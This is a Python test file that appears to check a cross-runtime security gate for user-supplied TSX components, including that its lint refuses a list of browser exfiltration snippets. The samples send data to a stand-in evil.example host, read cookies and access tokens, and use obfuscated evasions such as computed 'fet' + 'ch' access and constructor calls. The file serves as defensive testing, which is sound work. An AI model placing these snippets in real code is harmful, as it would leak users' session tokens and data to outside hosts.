"""Q82 / B-17 — the component source gate is ONE rule, held identical across
three runtimes.

`content_ir.kind_component.component_source` is arbitrary TSX that the browser
compiles with `new Function` inside the signed-in page's own origin. Three
places enforce what it may contain:

  * this host, before an agent tool writes (`kind_shared.py`);
  * the browser Studio, before it saves (matrx-frontend
    `features/agent-apps/utils/component-source-gate.ts`);
  * the database, for anything that reaches the table another way
    (`content_ir.kind_component_source_gate`).

The canonical lists live ONCE, as data, in matrx-frontend
`features/agent-apps/utils/component-source-gate.json`. This test fails the
moment this host's copies stop being byte-identical to it — which is the only
thing that makes "one rule" true rather than aspirational.

Skipped LOUDLY when matrx-frontend is not checked out, and FAILED when the run
declared itself enforcing with MATRX_PARITY_REQUIRED=1 (same rule as
`test_kind_surface_bootstrap.py`).
"""

from __future__ import annotations

import json
import os
from pathlib import Path

import pytest

from matrx_ai.tools.implementations.kind_shared import (
    COMPONENT_ALLOWED_IMPORTS,
    COMPONENT_BANNED_CALLABLES,
    COMPONENT_BANNED_COMPUTED_ACCESS,
    COMPONENT_BANNED_GLOBALS,
    COMPONENT_BANNED_MEMBER_ACCESS,
    COMPONENT_BANNED_MEMBER_CALLS,
    COMPONENT_BANNED_SYNTAX,
    component_globals_lint,
    component_import_lint,
)

AIDREAM_ROOT = Path(__file__).resolve().parents[3]
FE_GATE_JSON = (
    Path(os.environ.get("MATRX_FRONTEND_ROOT", AIDREAM_ROOT.parent / "matrx-frontend"))
    / "features/agent-apps/utils/component-source-gate.json"
)


def _load_canonical_lists() -> dict[str, list[str]]:
    if not FE_GATE_JSON.exists():
        message = (
            f"matrx-frontend gate lists not found at {FE_GATE_JSON} — component "
            "source-gate parity NOT verified (set MATRX_FRONTEND_ROOT)."
        )
        if os.environ.get("MATRX_PARITY_REQUIRED") == "1":
            pytest.fail(
                f"PARITY UNVERIFIED: {message}\n\nMATRX_PARITY_REQUIRED=1 — this run "
                "was declared enforcing. Fix the sibling checkout in the job; never "
                "relax this flag."
            )
        pytest.skip(f"SKIPPED LOUDLY: {message}")
    return json.loads(FE_GATE_JSON.read_text(encoding="utf-8"))


def test_allowed_imports_are_byte_identical_to_the_canonical_json() -> None:
    canonical = _load_canonical_lists()
    assert sorted(COMPONENT_ALLOWED_IMPORTS) == canonical["allowedImports"], (
        "The import allowlist drifted between this host and matrx-frontend. The "
        "browser compiler SKIPS an unknown import silently, so a module this host "
        "accepts and the browser does not becomes a component that renders "
        "nothing with no error. Edit component-source-gate.json and both "
        "runtimes together."
    )


def test_banned_global_lists_are_byte_identical_to_the_canonical_json() -> None:
    canonical = _load_canonical_lists()
    assert list(COMPONENT_BANNED_GLOBALS) == canonical["bannedGlobals"]
    assert list(COMPONENT_BANNED_CALLABLES) == canonical["bannedCallables"]
    assert list(COMPONENT_BANNED_MEMBER_ACCESS) == canonical["bannedMemberAccess"]
    assert list(COMPONENT_BANNED_MEMBER_CALLS) == canonical["bannedMemberCalls"]
    assert list(COMPONENT_BANNED_COMPUTED_ACCESS) == canonical["bannedComputedAccess"]
    assert list(COMPONENT_BANNED_SYNTAX) == canonical["bannedSyntax"]


def test_globals_lint_refuses_the_exfiltration_class() -> None:
    for snippet in (
        'fetch("https://evil.example/collect", { method: "POST" })',
        'window.fetch("https://evil.example")',
        "const x = new XMLHttpRequest();",
        'const s = new WebSocket("wss://evil.example");',
        'const e = new EventSource("https://evil.example");',
        "navigator.sendBeacon(url, body);",
        "const c = document.cookie;",
        'eval("1 + 1");',
        'const f = new Function("return 1");',
        'importScripts("https://evil.example/x.js");',
        'const t = localStorage.getItem("sb-access-token");',
        'const t = sessionStorage.getItem("sb-access-token");',
        # DD-124: three shapes this host accepted until 2026-09-11.
        'const q = (()=>{}).constructor("return 1")();',
        'const f = window["fet" + "ch"];',
        "const f = globalThis[name];",
        "const f = self[name];",
    ):
        refusal = component_globals_lint(
            f"export default function C({{ data }}) {{ {snippet} return null; }}"
        )
        assert refusal is not None, f"gate let through: {snippet}"
        assert refusal.startswith("This component ")


def test_globals_lint_passes_honest_component_source() -> None:
    honest = (
        'import React, { useState } from "react";\n'
        'import { Card } from "@/components/ui/card";\n'
        "type AgentFunctionSpec = { purpose?: string };\n"
        "export default function C({ data }) {\n"
        "  const [open, setOpen] = useState(false);\n"
        "  const raw = window.localStorage.getItem(storageKey);\n"
        "  return <Card>{data?.title}</Card>;\n"
        "}\n"
    )
    # `window.localStorage` stays legal: two live platform components
    # (research_report_card, agent_mandate_specification_workbench) persist
    # per-viewer UI state through it, and storage is not an exfiltration channel.
    assert component_globals_lint(honest) is None
    assert component_import_lint(honest) is None


def test_import_lint_refuses_a_dynamic_import() -> None:
    """DD-124. The static-import regex never saw `import(...)`, so this host
    accepted a live module loader for any URL until 2026-09-11 — while the
    TypeScript gate refused it. That IS the drift this parity file exists to
    stop, and it survived because no test named the shape."""
    refusal = component_import_lint(
        'export default function C() { import("https://evil.example/x.js"); }'
    )
    assert refusal is not None
    assert "dynamic import()" in refusal


def test_reading_dot_constructor_without_calling_it_stays_legal() -> None:
    """`x.constructor.name` is an honest type label; only the CALL is the
    evaluator."""
    assert component_globals_lint("const label = data.constructor.name;") is None
